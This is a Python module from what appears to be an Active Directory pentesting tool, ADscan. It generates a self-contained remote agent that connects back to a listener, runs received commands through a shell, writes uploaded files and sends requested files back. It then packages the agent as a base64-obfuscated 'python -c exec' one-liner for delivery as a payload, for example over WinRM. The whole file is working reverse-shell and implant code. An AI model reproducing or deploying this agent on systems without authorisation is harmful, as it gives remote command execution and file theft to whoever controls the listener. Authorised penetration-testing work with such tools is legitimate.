"""Remote agent payload generator for ADscan.

This module provides a self-contained Python agent script that implements the
same binary protocol as :mod:`adscan_internal.agent_protocol.AgentSession`.

The agent is intended to run on the remote host. It connects back to the
listener (``HOST``, ``PORT``) and processes messages:

- EXEC_REQUEST: run a command and send EXEC_OUTPUT with combined stdout/stderr.
- FILE_UPLOAD: create/overwrite a file with the provided content.
- FILE_DOWNLOAD_REQUEST: read a file and send it in FILE_DOWNLOAD_CHUNK
  messages, followed by FILE_DOWNLOAD_END.

The script is emitted as a string and can be wrapped in a one-liner payload
that uses ``python -c`` on the remote side.
"""

from __future__ import annotations

import base64


def _get_python_agent_source(host: str, port: int) -> str:
    """Return the remote Python agent source code with HOST/PORT embedded."""
    # The agent uses the same framing and message type values as
    # adscan_internal.agent_protocol but is self-contained to avoid any
    # external imports on the remote host.
    return f'''import socket
import struct
import subprocess
import json
import os

HOST = "{host}"
PORT = {port}

class MessageType:
    SHELL = 1
    EXEC_REQUEST = 2
    EXEC_OUTPUT = 3
    FILE_UPLOAD = 10
    FILE_UPLOAD_RESULT = 11
    FILE_DOWNLOAD_REQUEST = 12
    FILE_DOWNLOAD_CHUNK = 13
    FILE_DOWNLOAD_END = 14
    ERROR = 255

HEADER_STRUCT = struct.Struct("!HB")  # length (uint16) + type (uint8)

def encode_message(msg_type, payload):
    if len(payload) > 65535:
        raise ValueError("payload too large")
    header = HEADER_STRUCT.pack(len(payload) + 1, msg_type)
    return header + payload

def feed_messages(buffer):
    view = memoryview(buffer)
    offset = 0
    buf_len = len(buffer)
    while buf_len - offset >= HEADER_STRUCT.size:
        length, msg_type_raw = HEADER_STRUCT.unpack_from(view, offset)
        total_len = HEADER_STRUCT.size + length
        if buf_len - offset < total_len:
            break
        payload_start = offset + HEADER_STRUCT.size
        payload_end = payload_start + (length - 1)
        payload = bytes(view[payload_start:payload_end])
        yield msg_type_raw, payload
        offset += total_len
    if offset:
        del buffer[:offset]

def handle_exec(sock, payload):
    cmd = payload.decode("utf-8", "ignore")
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        out, _ = proc.communicate()
    except Exception as exc:  # pragma: no cover - defensive
        out = ("[agent exec error] " + str(exc)).encode("utf-8", "ignore")
    sock.sendall(encode_message(MessageType.EXEC_OUTPUT, out))

def handle_file_upload(sock, payload):
    try:
        meta_json, file_bytes = payload.split(b"\\n", 1)
        meta = json.loads(meta_json.decode("utf-8"))
        path = meta.get("path")
        if not path:
            raise ValueError("missing 'path' in FILE_UPLOAD meta")
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "wb") as f:
            f.write(file_bytes)
        sock.sendall(encode_message(MessageType.FILE_UPLOAD_RESULT, b"OK"))
    except Exception as exc:  # pragma: no cover - defensive
        msg = ("[agent upload error] " + str(exc)).encode("utf-8", "ignore")
        sock.sendall(encode_message(MessageType.ERROR, msg))

def handle_file_download(sock, payload):
    path = payload.decode("utf-8", "ignore")
    try:
        with open(path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sock.sendall(
                    encode_message(MessageType.FILE_DOWNLOAD_CHUNK, chunk)
                )
        sock.sendall(encode_message(MessageType.FILE_DOWNLOAD_END, b""))
    except Exception as exc:  # pragma: no cover - defensive
        msg = ("[agent download error] " + str(exc)).encode("utf-8", "ignore")
        sock.sendall(encode_message(MessageType.ERROR, msg))

def main():
    buf = bytearray()
    s = socket.create_connection((HOST, PORT))
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            buf.extend(data)
            for msg_type, payload in feed_messages(buf):
                if msg_type == MessageType.EXEC_REQUEST:
                    handle_exec(s, payload)
                elif msg_type == MessageType.FILE_UPLOAD:
                    handle_file_upload(s, payload)
                elif msg_type == MessageType.FILE_DOWNLOAD_REQUEST:
                    handle_file_download(s, payload)
    finally:
        try:
            s.close()
        except Exception:
            pass

if __name__ == "__main__":
    main()
'''


def build_python_agent_one_liner(
    host: str,
    port: int,
    python_exe: str = "python",
) -> str:
    """Return a python -c one-liner that runs the agent on the remote host.

    Args:
        host: IP/hostname of the ADscan listener.
        port: Listener TCP port.
        python_exe: Name/path of the Python interpreter on the remote host.

    Returns:
        A command string suitable for use as a payload (e.g. via WinRM).
    """
    source = _get_python_agent_source(host, port)
    b64 = base64.b64encode(source.encode("utf-8")).decode("ascii")
    # Use a minimal inline decoder to avoid multiline quoting issues.
    return f"{python_exe} -c \"import base64;exec(base64.b64decode('{b64}').decode())\""
